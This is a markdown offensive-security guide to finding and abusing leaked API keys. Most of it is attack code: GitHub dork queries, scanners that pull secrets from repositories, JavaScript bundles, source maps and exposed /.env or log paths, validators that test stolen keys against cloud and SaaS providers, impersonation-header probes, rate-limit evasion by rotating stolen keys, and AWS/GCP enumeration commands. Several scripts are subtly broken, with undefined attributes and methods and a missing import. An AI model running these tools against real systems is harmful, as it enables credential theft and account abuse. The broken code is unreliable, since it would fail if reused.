# API Key Security Attacks

## Overview

API keys remain one of the most commonly leaked credential types, with GitHub detecting over 39 million secret leaks in 2024 alone. This document covers API key leakage discovery, exploitation techniques, scope escalation, rate limit bypass, and the distinction between API keys and OAuth tokens from a security testing perspective.

**Sources**:
- https://github.blog/security/application-security/next-evolution-github-advanced-security/
- https://swisskyrepo.github.io/PayloadsAllTheThings/API%20Key%20Leaks/
- https://gbhackers.com/massive-github-leak/

---

## 1. API Key Leakage Discovery

### 1.1 GitHub and Source Code Repositories

**Vulnerability**: Developers frequently commit API keys, tokens, and secrets to public repositories.

**GitHub Dorking Queries**:
```
# Generic secret patterns
"api_key" language:python
"apikey" language:javascript
"secret_key" language:ruby
"PRIVATE_KEY" language:go
"access_token" language:java
"client_secret" extension:json
"password" extension:yaml
"credentials" extension:env

# Cloud provider keys
"AKIA" language:python          # AWS Access Key ID prefix
"AIza" language:javascript      # Google API Key prefix
"sk-" language:python           # OpenAI API Key prefix
"sk_live_" language:ruby        # Stripe Live Key prefix
"SG." language:python           # SendGrid Key prefix
"xoxb-" language:javascript     # Slack Bot Token prefix
"xoxp-" language:javascript     # Slack User Token prefix
"ghp_" language:python          # GitHub Personal Token prefix
"glpat-" language:ruby          # GitLab Personal Token prefix
"sq0csp-" language:java         # Square OAuth Secret prefix

# File-specific searches
filename:.env "API_KEY"
filename:.env "SECRET"
filename:config.json "api_key"
filename:credentials.json
filename:.npmrc _authToken
filename:.pypirc password
filename:docker-compose.yml "PASSWORD"
filename:application.properties "password"
filename:wp-config.php "DB_PASSWORD"
filename:settings.py SECRET_KEY
```

**Automated GitHub Scanning**:
```python
#!/usr/bin/env python3
"""GitHub API Key Scanner"""

import requests
import re
import time

class GitHubKeyScanner:
    """Scan GitHub for leaked API keys and secrets."""

    # Regex patterns for common API key formats
    KEY_PATTERNS = {
        'aws_access_key': r'AKIA[0-9A-Z]{16}',
        'aws_secret_key': r'[0-9a-zA-Z/+]{40}',
        'google_api_key': r'AIza[0-9A-Za-z_-]{35}',
        'google_oauth': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
        'github_token': r'gh[pousr]_[0-9a-zA-Z]{36}',
        'gitlab_token': r'glpat-[0-9a-zA-Z_-]{20}',
        'slack_token': r'xox[bpors]-[0-9a-zA-Z-]+',
        'stripe_live': r'sk_live_[0-9a-zA-Z]{24,}',
        'stripe_test': r'sk_test_[0-9a-zA-Z]{24,}',
        'openai_key': r'sk-[0-9a-zA-Z]{48}',
        'sendgrid_key': r'SG\.[0-9a-zA-Z_-]{22}\.[0-9a-zA-Z_-]{43}',
        'twilio_sid': r'AC[0-9a-f]{32}',
        'twilio_token': r'[0-9a-f]{32}',
        'mailgun_key': r'key-[0-9a-zA-Z]{32}',
        'firebase_key': r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
        'heroku_key': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
        'jwt_token': r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
        'generic_api_key': r'[Aa][Pp][Ii][_-]?[Kk][Ee][Yy]\s*[:=]\s*["\']?[0-9a-zA-Z_-]{16,}["\']?',
        'generic_secret': r'[Ss][Ee][Cc][Rr][Ee][Tt]\s*[:=]\s*["\']?[0-9a-zA-Z_-]{16,}["\']?',
        'private_key_header': r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
        'huggingface_token': r'hf_[a-zA-Z0-9]{34}',
        'azure_key': r'[0-9a-zA-Z+/]{86}==',
        'digitalocean_token': r'dop_v1_[0-9a-f]{64}',
    }

    def __init__(self, github_token=None):
        self.session = requests.Session()
        if github_token:
            self.session.headers['Authorization'] = f'token {github_token}'
        self.session.headers['Accept'] = 'application/vnd.github.v3.text-match+json'

    def search_code(self, query, max_pages=5):
        """Search GitHub code for secret patterns."""
        results = []
        for page in range(1, max_pages + 1):
            resp = self.session.get(
                'https://api.github.com/search/code',
                params={'q': query, 'page': page, 'per_page': 30}
            )
            if resp.status_code == 200:
                data = resp.json()
                for item in data.get('items', []):
                    results.append({
                        'repo': item['repository']['full_name'],
                        'path': item['path'],
                        'url': item['html_url'],
                        'text_matches': [m.get('fragment', '') for m in item.get('text_matches', [])]
                    })
            elif resp.status_code == 403:
                print("[!] Rate limited, waiting...")
                time.sleep(60)
            time.sleep(2)  # Rate limit compliance
        return results

    def scan_repo_contents(self, owner, repo):
        """Deep scan a repository for secrets."""
        findings = []
        sensitive_files = [
            '.env', '.env.local', '.env.production', '.env.staging',
            'config.json', 'config.yaml', 'config.yml',
            'credentials.json', 'secrets.json', 'secrets.yaml',
            '.npmrc', '.pypirc', '.docker/config.json',
            'docker-compose.yml', 'docker-compose.override.yml',
            'application.properties', 'application.yml',
            'appsettings.json', 'appsettings.Development.json',
            'wp-config.php', 'settings.py', 'local_settings.py',
            '.htpasswd', 'id_rsa', 'id_ed25519',
        ]

        for filepath in sensitive_files:
            try:
                resp = self.session.get(
                    f'https://api.github.com/repos/{owner}/{repo}/contents/{filepath}'
                )
                if resp.status_code == 200:
                    import base64
                    content = base64.b64decode(resp.json()['content']).decode('utf-8', errors='ignore')
                    secrets = self._extract_secrets(content)
                    if secrets:
                        findings.append({
                            'file': filepath,
                            'secrets': secrets
                        })
            except Exception:
                pass

        return findings

    def _extract_secrets(self, content):
        """Extract secrets from content using regex patterns."""
        found = []
        for key_type, pattern in self.KEY_PATTERNS.items():
            matches = re.findall(pattern, content)
            for match in matches:
                found.append({
                    'type': key_type,
                    'value': match[:8] + '...' + match[-4:] if len(match) > 16 else match,
                    'full_length': len(match)
                })
        return found
```

### 1.2 JavaScript File Analysis

**Vulnerability**: Client-side JavaScript files frequently contain embedded API keys.

**Scanning Script**:
```python
#!/usr/bin/env python3
"""JavaScript API Key Extractor"""

import requests
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class JSKeyExtractor:
    """Extract API keys from JavaScript files in web applications."""

    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def discover_js_files(self):
        """Find all JavaScript files referenced by the target."""
        js_files = set()

        # Get main page
        resp = self.session.get(self.target_url)
        soup = BeautifulSoup(resp.text, 'html.parser')

        # Find script tags
        for script in soup.find_all('script', src=True):
            js_url = urljoin(self.target_url, script['src'])
            js_files.add(js_url)

        # Find inline scripts for dynamic imports
        for script in soup.find_all('script'):
            if script.string:
                # Look for dynamic imports
                imports = re.findall(r'import\s*\([\'"](.*?)[\'"]\)', script.string)
                for imp in imports:
                    js_files.add(urljoin(self.target_url, imp))

        # Common JS bundle paths
        common_paths = [
            '/static/js/main.js', '/static/js/app.js',
            '/dist/bundle.js', '/build/static/js/main.*.js',
            '/assets/js/app.js', '/js/config.js',
            '/_next/static/chunks/*.js',
            '/static/js/vendor.*.chunk.js',
        ]

        return list(js_files)

    def extract_keys_from_js(self, js_url):
        """Extract potential API keys from a JavaScript file."""
        try:
            resp = self.session.get(js_url)
            content = resp.text

            findings = []

            # API key patterns in JS
            patterns = {
                'hardcoded_key': r'["\'](?:api[_-]?key|apikey|api_secret|access_token|auth_token|secret_key)["\']:\s*["\']([^"\']+)["\']',
                'firebase_config': r'apiKey:\s*["\']([^"\']+)["\']',
                'google_maps': r'key=([A-Za-z0-9_-]{39})',
                'aws_key': r'["\']?(AKIA[0-9A-Z]{16})["\']?',
                'stripe_key': r'["\']?(pk_(?:live|test)_[0-9a-zA-Z]{24,})["\']?',
                'env_variable_leak': r'process\.env\.([A-Z_]+_KEY|[A-Z_]+_SECRET|[A-Z_]+_TOKEN)',
                'base_url_with_key': r'https?://[^"\s]+[?&](?:key|api_key|apikey|token|access_token)=([^"&\s]+)',
                'authorization_header': r'["\']Authorization["\']\s*:\s*["\'](?:Bearer |Basic )\s*([^"\']+)["\']',
                'graphql_key': r'["\']x-api-key["\']\s*:\s*["\']([^"\']+)["\']',
            }

            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    findings.append({
                        'type': pattern_name,
                        'value': match,
                        'url': js_url,
                        'severity': self._assess_severity(pattern_name, match)
                    })

            return findings

        except Exception as e:
            return [{'error': str(e), 'url': js_url}]

    def _assess_severity(self, pattern_name, value):
        """Assess the severity of a found key."""
        high_severity = ['aws_key', 'stripe_key', 'authorization_header']
        medium_severity = ['hardcoded_key', 'firebase_config']
        if pattern_name in high_severity:
            return 'HIGH'
        elif pattern_name in medium_severity:
            return 'MEDIUM'
        return 'LOW'

    def scan_webpack_sourcemaps(self):
        """Check for webpack source maps that may contain secrets."""
        sourcemap_extensions = ['.js.map', '.min.js.map', '.chunk.js.map']
        findings = []

        for js_url in self.discover_js_files():
            for ext in sourcemap_extensions:
                map_url = re.sub(r'\.js$', ext, js_url)
                try:
                    resp = self.session.get(map_url)
                    if resp.status_code == 200 and 'mappings' in resp.text:
                        # Source map found - may contain original source with secrets
                        findings.append({
                            'sourcemap_url': map_url,
                            'size': len(resp.text),
                            'contains_sources': 'sourcesContent' in resp.text,
                            'severity': 'HIGH'
                        })
                        # Extract secrets from source map content
                        secrets = self._extract_secrets_from_sourcemap(resp.text)
                        if secrets:
                            findings[-1]['secrets'] = secrets
                except:
                    pass

        return findings

    def _extract_secrets_from_sourcemap(self, sourcemap_content):
        """Extract secrets from source map content."""
        import json
        try:
            data = json.loads(sourcemap_content)
            sources_content = data.get('sourcesContent', [])
            secrets = []
            for source in sources_content:
                if source:
                    keys = self._extract_keys_from_js(source)
                    secrets.extend(keys)
            return secrets
        except:
            return []
```

### 1.3 Mobile Application API Key Extraction

**Vulnerability**: Mobile applications often embed API keys in the binary or configuration files.

**Android APK Analysis**:
```bash
# Decompile APK
apktool d target.apk -o decompiled/

# Search for API keys in decompiled source
grep -rn "api_key\|apikey\|api-key\|secret\|token\|password" decompiled/

# Search strings in DEX files
strings decompiled/classes.dex | grep -iE "api.?key|secret|token|auth|bearer"

# Check resources
grep -rn "api_key" decompiled/res/values/strings.xml
cat decompiled/res/values/strings.xml | grep -i key

# Check AndroidManifest for API keys in meta-data
grep "meta-data" decompiled/AndroidManifest.xml

# Use JADX for better decompilation
jadx target.apk -d jadx_output/
grep -rn "api_key\|apiKey\|API_KEY\|secret\|token" jadx_output/
```

**iOS IPA Analysis**:
```bash
# Unzip IPA
unzip target.ipa -d extracted/

# Search Mach-O binary for strings
strings extracted/Payload/*.app/* | grep -iE "api.?key|secret|token|auth"

# Search plist files
plutil -p extracted/Payload/*.app/Info.plist | grep -i key

# Check embedded frameworks
find extracted/ -name "*.framework" -exec strings {} \; | grep -iE "api.?key"

# Use class-dump for Objective-C headers
class-dump extracted/Payload/*.app/* | grep -i "api\|key\|secret\|token"
```

### 1.4 Log File and Error Message Leakage

**Vulnerability**: API keys leak through application logs, error messages, and debug output.

```python
#!/usr/bin/env python3
"""API Key Log Leakage Scanner"""

import requests
import re

class LogLeakageScanner:
    """Scan for API key leakage in logs and error messages."""

    def __init__(self, target_url):
        self.target_url = target_url

    def test_error_message_leakage(self):
        """Trigger errors that may expose API keys."""
        test_cases = [
            # Invalid API key to trigger error with key in response
            {'headers': {'Authorization': 'Bearer invalid_key_test'}},
            {'headers': {'X-API-Key': 'invalid'}},
            {'params': {'api_key': 'invalid'}},

            # Trigger stack traces
            {'headers': {'Content-Type': 'invalid'}},
            {'data': 'invalid json'},
            {'params': {'debug': 'true'}},
            {'params': {'verbose': '1'}},
        ]

        findings = []
        for test in test_cases:
            try:
                resp = self.session.get(self.target_url, **test)
                # Check response for leaked keys
                for pattern_name, pattern in KEY_PATTERNS.items():
                    matches = re.findall(pattern, resp.text)
                    if matches:
                        findings.append({
                            'trigger': test,
                            'key_type': pattern_name,
                            'leaked_in': 'response_body'
                        })

                # Check response headers for keys
                for header, value in resp.headers.items():
                    for pattern_name, pattern in KEY_PATTERNS.items():
                        if re.search(pattern, value):
                            findings.append({
                                'trigger': test,
                                'key_type': pattern_name,
                                'leaked_in': f'header:{header}'
                            })
            except:
                pass

        return findings

    def scan_common_log_paths(self):
        """Check common log file paths for exposed secrets."""
        log_paths = [
            '/debug.log', '/error.log', '/access.log',
            '/logs/error.log', '/logs/debug.log',
            '/var/log/app.log', '/tmp/debug.log',
            '/api/debug', '/api/logs', '/api/errors',
            '/.env', '/.env.local', '/.env.production',
            '/phpinfo.php', '/server-info', '/server-status',
            '/actuator/env', '/actuator/configprops',
            '/config', '/admin/config',
            '/elmah.axd', '/trace.axd',  # .NET error logs
            '/_debug', '/__debug__',  # Django debug
        ]

        findings = []
        for path in log_paths:
            try:
                resp = requests.get(f"{self.target_url}{path}", timeout=5)
                if resp.status_code == 200 and len(resp.text) > 100:
                    # Scan content for secrets
                    for pattern_name, pattern in KEY_PATTERNS.items():
                        if re.search(pattern, resp.text):
                            findings.append({
                                'path': path,
                                'key_type': pattern_name,
                                'severity': 'CRITICAL'
                            })
            except:
                pass

        return findings
```

---

## 2. API Key Exploitation Techniques

### 2.1 Key Validation and Scope Discovery

**Tool**: After finding an API key, determine its scope and permissions.

```python
#!/usr/bin/env python3
"""API Key Scope Discovery and Validation"""

import requests
import json

class APIKeyValidator:
    """Validate and determine scope of discovered API keys."""

    VALIDATION_ENDPOINTS = {
        'aws': {
            'url': 'https://sts.amazonaws.com/',
            'method': 'POST',
            'params': {'Action': 'GetCallerIdentity', 'Version': '2011-06-15'},
            'auth_type': 'aws_sig_v4',
        },
        'google_maps': {
            'url': 'https://maps.googleapis.com/maps/api/geocode/json',
            'params': {'address': 'test', 'key': '{KEY}'},
        },
        'github': {
            'url': 'https://api.github.com/user',
            'headers': {'Authorization': 'token {KEY}'},
        },
        'gitlab': {
            'url': 'https://gitlab.com/api/v4/user',
            'headers': {'PRIVATE-TOKEN': '{KEY}'},
        },
        'slack': {
            'url': 'https://slack.com/api/auth.test',
            'params': {'token': '{KEY}'},
        },
        'stripe': {
            'url': 'https://api.stripe.com/v1/charges',
            'auth': ('{KEY}', ''),
        },
        'twilio': {
            'url': 'https://api.twilio.com/2010-04-01/Accounts.json',
            'auth': ('{SID}', '{KEY}'),
        },
        'sendgrid': {
            'url': 'https://api.sendgrid.com/v3/scopes',
            'headers': {'Authorization': 'Bearer {KEY}'},
        },
        'openai': {
            'url': 'https://api.openai.com/v1/models',
            'headers': {'Authorization': 'Bearer {KEY}'},
        },
        'firebase': {
            'url': 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={KEY}',
            'method': 'POST',
            'json': {'returnSecureToken': True},
        },
        'huggingface': {
            'url': 'https://huggingface.co/api/whoami-v2',
            'headers': {'Authorization': 'Bearer {KEY}'},
        },
    }

    def validate_key(self, key_type, key_value, **kwargs):
        """Validate an API key and determine its scope."""
        config = self.VALIDATION_ENDPOINTS.get(key_type)
        if not config:
            return {'error': f'Unknown key type: {key_type}'}

        # Replace key placeholder
        url = config['url'].replace('{KEY}', key_value)
        headers = {k: v.replace('{KEY}', key_value) for k, v in config.get('headers', {}).items()}
        params = {k: v.replace('{KEY}', key_value) for k, v in config.get('params', {}).items()}

        method = config.get('method', 'GET')
        auth = None
        if 'auth' in config:
            auth = tuple(v.replace('{KEY}', key_value).replace('{SID}', kwargs.get('sid', ''))
                         for v in config['auth'])

        try:
            resp = requests.request(
                method, url,
                headers=headers, params=params, auth=auth,
                json=config.get('json'),
                timeout=10
            )
            return {
                'key_type': key_type,
                'valid': resp.status_code in [200, 201],
                'status_code': resp.status_code,
                'response': resp.json() if resp.headers.get('content-type', '').startswith('application/json') else resp.text[:500],
                'permissions': self._extract_permissions(key_type, resp)
            }
        except Exception as e:
            return {'key_type': key_type, 'error': str(e)}

    def _extract_permissions(self, key_type, response):
        """Extract permission/scope information from validation response."""
        if key_type == 'github' and response.status_code == 200:
            scopes = response.headers.get('X-OAuth-Scopes', 'none')
            return {'scopes': scopes.split(', ')}
        elif key_type == 'sendgrid' and response.status_code == 200:
            return {'scopes': response.json().get('scopes', [])}
        elif key_type == 'slack' and response.status_code == 200:
            return response.json()
        return {}
```

### 2.2 API Key Privilege Escalation

**Vulnerability**: API keys with limited scope can sometimes be escalated to broader access.

```python
class APIKeyEscalation:
    """Techniques for escalating API key privileges."""

    def test_scope_escalation(self, base_url, api_key):
        """Test if an API key provides access beyond its intended scope."""
        test_endpoints = [
            # Administrative endpoints
            {'path': '/admin/users', 'method': 'GET'},
            {'path': '/admin/settings', 'method': 'GET'},
            {'path': '/admin/config', 'method': 'GET'},
            {'path': '/admin/logs', 'method': 'GET'},

            # User management
            {'path': '/api/users', 'method': 'GET'},
            {'path': '/api/users', 'method': 'POST', 'data': {'email': 'test@test.com'}},

            # Data export
            {'path': '/api/export', 'method': 'GET'},
            {'path': '/api/backup', 'method': 'GET'},
            {'path': '/api/dump', 'method': 'GET'},

            # Internal APIs
            {'path': '/internal/api/status', 'method': 'GET'},
            {'path': '/api/internal/metrics', 'method': 'GET'},

            # Different API versions (may have different authz)
            {'path': '/api/v1/admin', 'method': 'GET'},
            {'path': '/api/v2/admin', 'method': 'GET'},

            # GraphQL introspection
            {'path': '/graphql', 'method': 'POST',
             'data': {'query': '{ __schema { types { name } } }'}},
        ]

        results = []
        headers = {
            'Authorization': f'Bearer {api_key}',
            'X-API-Key': api_key,
        }

        for test in test_endpoints:
            try:
                resp = requests.request(
                    test['method'], f"{base_url}{test['path']}",
                    headers=headers,
                    json=test.get('data'),
                    timeout=5
                )
                if resp.status_code not in [401, 403, 404]:
                    results.append({
                        'endpoint': test['path'],
                        'method': test['method'],
                        'status': resp.status_code,
                        'accessible': True,
                        'response_preview': resp.text[:200]
                    })
            except:
                pass

        return results

    def test_key_impersonation(self, base_url, api_key):
        """Test if the API key can impersonate other users or services."""
        impersonation_headers = [
            {'X-Forwarded-User': 'admin'},
            {'X-User-Id': '1'},
            {'X-Original-User': 'admin@company.com'},
            {'X-Impersonate-User': 'admin'},
            {'On-Behalf-Of': 'admin'},
            {'X-Auth-User': 'admin'},
            {'Sudo': 'admin'},
        ]

        results = []
        for extra_header in impersonation_headers:
            headers = {'Authorization': f'Bearer {api_key}', **extra_header}
            try:
                resp = requests.get(f"{base_url}/api/me", headers=headers, timeout=5)
                if resp.status_code == 200:
                    results.append({
                        'header': extra_header,
                        'response': resp.json() if 'json' in resp.headers.get('content-type', '') else resp.text[:200],
                        'possible_impersonation': True
                    })
            except:
                pass

        return results
```

### 2.3 Rate Limit Bypass with Stolen Keys

**Vulnerability**: Stolen API keys can be used to bypass rate limits by distributing requests across multiple keys.

```python
class RateLimitBypass:
    """Techniques for bypassing API rate limits using stolen keys."""

    def __init__(self, api_keys):
        self.api_keys = api_keys
        self.current_index = 0

    def rotate_key(self):
        """Rotate through available API keys."""
        key = self.api_keys[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.api_keys)
        return key

    def distributed_request(self, url, count):
        """Distribute requests across multiple API keys."""
        results = []
        for i in range(count):
            key = self.rotate_key()
            headers = {'Authorization': f'Bearer {key}'}
            resp = requests.get(url, headers=headers)
            results.append({
                'request_num': i,
                'key_used': key[:8] + '...',
                'status': resp.status_code,
                'rate_limit_remaining': resp.headers.get('X-RateLimit-Remaining', 'unknown')
            })
        return results

    def test_rate_limit_evasion(self, url, api_key):
        """Test various rate limit evasion techniques with a single key."""
        evasion_techniques = [
            # IP rotation headers
            {'X-Forwarded-For': '192.168.1.{}'.format(i)} for i in range(10)
        ] + [
            {'X-Real-IP': '10.0.0.{}'.format(i)} for i in range(10)
        ] + [
            # Different API key delivery methods
            {'Authorization': f'Bearer {api_key}'},
            {'X-API-Key': api_key},
            {'Api-Key': api_key},
        ]

        results = []
        for headers in evasion_techniques:
            base_headers = {'Authorization': f'Bearer {api_key}'}
            base_headers.update(headers)
            resp = requests.get(url, headers=base_headers)
            results.append({
                'headers': headers,
                'status': resp.status_code,
                'rate_limited': resp.status_code == 429
            })

        return results
```

---

## 3. API Key vs OAuth Token Confusion

### 3.1 Token Type Confusion Attacks

**Vulnerability**: Applications that accept both API keys and OAuth tokens may have different authorization checks for each, allowing escalation.

```python
class TokenTypeConfusion:
    """Exploit confusion between API keys and OAuth tokens."""

    def test_type_confusion(self, base_url, api_key=None, oauth_token=None):
        """Test if API key can be used where OAuth token is expected and vice versa."""
        results = []

        # Use API key as OAuth Bearer token
        if api_key:
            resp = requests.get(
                f"{base_url}/api/protected",
                headers={'Authorization': f'Bearer {api_key}'}
            )
            results.append({
                'test': 'API key as Bearer token',
                'accepted': resp.status_code not in [401, 403]
            })

        # Use OAuth token as API key
        if oauth_token:
            for header_name in ['X-API-Key', 'Api-Key', 'apikey']:
                resp = requests.get(
                    f"{base_url}/api/protected",
                    headers={header_name: oauth_token}
                )
                results.append({
                    'test': f'OAuth token as {header_name}',
                    'accepted': resp.status_code not in [401, 403]
                })

            # OAuth token in query parameter
            resp = requests.get(
                f"{base_url}/api/protected",
                params={'api_key': oauth_token}
            )
            results.append({
                'test': 'OAuth token as api_key query param',
                'accepted': resp.status_code not in [401, 403]
            })

        return results
```

---

## 4. Key Rotation Exploitation

### 4.1 Exploiting Rotation Windows

**Vulnerability**: During key rotation, both old and new keys may be valid simultaneously, creating a window for exploitation.

```python
class KeyRotationExploiter:
    """Exploit API key rotation windows and procedures."""

    def test_old_key_validity(self, base_url, old_key, timeout_hours=48):
        """Test if old/revoked API keys are still accepted."""
        headers = {'Authorization': f'Bearer {old_key}'}
        resp = requests.get(f"{base_url}/api/status", headers=headers)

        return {
            'old_key_valid': resp.status_code not in [401, 403],
            'status_code': resp.status_code,
            'recommendation': 'Revoked keys should be immediately invalidated'
        }

    def test_rotation_race_condition(self, base_url, api_key):
        """Test for race conditions during key rotation."""
        import threading

        results = []

        def make_request(key, request_id):
            resp = requests.get(
                f"{base_url}/api/status",
                headers={'Authorization': f'Bearer {key}'}
            )
            results.append({
                'request_id': request_id,
                'key': key[:8] + '...',
                'status': resp.status_code,
                'timestamp': time.time()
            })

        # Trigger key rotation while making concurrent requests
        threads = []
        for i in range(20):
            t = threading.Thread(target=make_request, args=(api_key, i))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        return results
```

---

## 5. Cloud-Specific API Key Attacks

### 5.1 AWS API Key Exploitation

```bash
# Validate AWS credentials
aws sts get-caller-identity

# Enumerate permissions
enumerate-iam --access-key AKIA... --secret-key ...
# Or use pacu
python3 pacu.py
> import_keys AKIA... / secret_key
> run iam__enum_permissions
> run iam__privesc_scan

# Check for admin access
aws iam list-users
aws iam list-roles
aws s3 ls
aws ec2 describe-instances

# Enumerate services accessible with the key
for service in s3 ec2 lambda rds dynamodb; do
    aws $service help 2>/dev/null && echo "$service: accessible"
done
```

### 5.2 Google Cloud API Key Exploitation

```bash
# Test Google API key across services
# Maps
curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=API_KEY"

# Custom Search
curl "https://www.googleapis.com/customsearch/v1?key=API_KEY&q=test"

# Firebase
curl "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
  -H "Content-Type: application/json" -d '{"returnSecureToken":true}'

# Directions
curl "https://maps.googleapis.com/maps/api/directions/json?origin=NYC&destination=LA&key=API_KEY"

# For service account keys
gcloud auth activate-service-account --key-file=key.json
gcloud projects list
gcloud iam service-accounts list
```

---

## 6. Testing Checklist

```
# Discovery
[ ] GitHub/GitLab dork for target organization
[ ] Scan JavaScript files for embedded keys
[ ] Check source maps for leaked secrets
[ ] Analyze mobile app binaries
[ ] Scan error messages and debug endpoints
[ ] Check common log file paths
[ ] Review API documentation for exposed examples
[ ] Check Postman collections for hardcoded keys
[ ] Scan Docker images for embedded secrets
[ ] Review CI/CD configuration files

# Validation
[ ] Verify key validity against provider API
[ ] Determine key scope and permissions
[ ] Test key across different API versions
[ ] Check key expiration settings

# Exploitation
[ ] Test scope escalation
[ ] Test user impersonation
[ ] Test rate limit bypass
[ ] Test token type confusion
[ ] Test old/rotated key validity
[ ] Test cross-service access
```

---

## References

- GitHub Secret Scanning: https://github.blog/security/application-security/next-evolution-github-advanced-security/
- PayloadsAllTheThings API Key Leaks: https://swisskyrepo.github.io/PayloadsAllTheThings/API%20Key%20Leaks/
- GitHub Leaked Keys Reference: https://gist.github.com/win3zz/0a1c70589fcbea64dba4588b93095855
- OWASP API Security Top 10: https://owasp.org/API-Security/
- TruffleHog: https://github.com/trufflesecurity/trufflehog
- GitLeaks: https://github.com/gitleaks/gitleaks
